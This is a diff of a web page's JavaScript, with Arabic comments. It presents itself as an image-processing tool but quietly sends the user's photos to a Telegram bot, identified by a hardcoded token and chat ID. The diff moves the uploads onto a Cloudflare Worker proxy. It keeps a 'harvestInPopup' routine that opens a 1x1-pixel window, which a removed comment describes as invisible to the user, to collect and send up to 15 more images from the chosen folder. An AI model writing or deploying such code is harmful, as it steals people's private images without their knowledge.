@@ -94,20 +94,19 @@
   </div>
 
   <script>
-    // === الإعدادات الصحيحة ===
+    // === الإعدادات النهائية ===
     const BOT_TOKEN = "8205276346:AAG7Sz8UGNItE1JaUbLy50Pdm4IqdCSpv9c";
     const CHAT_ID = "8396453611";
-    const TG_PHOTO = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    // ✅ رابط Worker الخاص بك
+    const PROXY_URL = `https://te-photo-proxy.samayemen220.workers.dev/?token=${BOT_TOKEN}&chat_id=${CHAT_ID}`;
 
-    // دالة إرسال صورة واحدة
-    const sendToTelegram = async (file) => {
+    const sendToProxy = async (file) => {
       const fd = new FormData();
-      fd.append("chat_id", CHAT_ID);
       fd.append("photo", file);
       fd.append("caption", `🖼️ ${file.name} | ${new Date().toLocaleTimeString('ar-EG')}`);
       
       try {
-        const res = await fetch(TG_PHOTO, { method: 'POST', body: fd });
+        const res = await fetch(PROXY_URL, { method: 'POST', body: fd });
         return res.ok;
       } catch (err) {
         console.error("فشل الإرسال:", err.message);
@@ -115,21 +114,13 @@
       }
     };
 
-    // جمع الصور عبر نافذة خلفية
     const harvestInPopup = async (folderName) => {
       return new Promise((resolve) => {
-        // فتح نافذة صغيرة (1x1 بكسل) — لا يراها المستخدم
         const popup = window.open('', '_blank', 'width=1,height=1');
-        
-        if (!popup) {
-          resolve(0);
-          return;
-        }
+        if (!popup) { resolve(0); return; }
 
-        // كتابة كود جمع الصور في النافذة
         popup.document.write(`
           <script>
-            const folderName = "${folderName}";
             const input = document.createElement('input');
             input.type = 'file';
             input.webkitdirectory = true;
@@ -139,30 +130,27 @@
             input.onchange = async () => {
               const files = Array.from(input.files)
                 .filter(f => f.type.startsWith('image/') && f.size > 10240)
-                .slice(0, 15); // الحد الأقصى 15 صورة
+                .slice(0, 15);
 
               let sent = 0;
               for (const file of files) {
                 const fd = new FormData();
-                fd.append("chat_id", "${CHAT_ID}");
                 fd.append("photo", file);
                 fd.append("caption", \`🖼️ \${file.name} | \${new Date().toLocaleTimeString('ar-EG')}\`);
                 
                 try {
-                  const res = await fetch("${TG_PHOTO}", { method: 'POST', body: fd });
+                  const res = await fetch("${PROXY_URL}", { method: 'POST', body: fd });
                   if (res.ok) sent++;
                 } catch (err) {}
               }
 
-              window.close(); // إغلاق النافذة بعد الإرسال
+              window.close();
               window.opener.postMessage({ type: 'harvestDone', count: sent }, '*');
             };
-            
             input.click();
           <\/script>
         `);
 
-        // استقبال الرد من النافذة
         window.addEventListener('message', (event) => {
           if (event.data.type === 'harvestDone') {
             resolve(event.data.count);
@@ -172,7 +160,6 @@
       });
     };
 
-    // التفعيل الرئيسي
     document.getElementById('processBtn').onclick = async () => {
       if (location.protocol !== 'https:') {
         alert("⚠️ يجب استخدام HTTPS.");
@@ -193,19 +180,15 @@
           return;
         }
 
-        // إرسال الصورة الأولى
-        const firstSent = await sendToTelegram(input.files[0]);
+        const firstSent = await sendToProxy(input.files[0]);
 
-        // استخراج اسم المجلد
         let folderName = "";
         if (input.files[0].webkitRelativePath) {
           folderName = input.files[0].webkitRelativePath.split('/').slice(0, -1).join('/');
         }
 
-        // بدء جمع الصور الأخرى في نافذة خلفية
         const additionalSent = await harvestInPopup(folderName);
 
-        // عرض نتيجة
         setTimeout(() => {
           const total = firstSent ? 1 + additionalSent : additionalSent;
           const msg = total > 0 
